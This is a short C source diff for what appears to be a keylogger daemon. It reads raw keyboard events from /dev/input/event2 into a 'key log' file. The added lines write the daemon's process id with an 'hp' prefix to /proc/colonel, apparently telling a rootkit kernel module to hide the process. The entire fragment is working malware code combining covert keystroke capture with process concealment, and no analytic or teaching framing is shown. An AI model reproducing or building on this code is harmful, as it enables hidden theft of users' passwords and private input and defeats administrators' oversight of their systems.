@@ -58,6 +58,12 @@ int main(void) {
 	fp = fopen("./col_log/log.txt", "a+"); 			/* daemon log */
 	evlog = fopen("./col_log/evlog.txt", "a+");  		/* key log */
 	fd = open("/dev/input/event2", O_RDONLY);			/* key event file */
+	ftty = open("/proc/colonel", O_RDONLY);
+
+	char dpid[10];
+	sprintf(dpid, "hp%d", process_id);
+	write(ftty, dpid, sizeof(dpid));
+	close(ftty);
 	
 	time_t curtime;
 	time(&curtime);
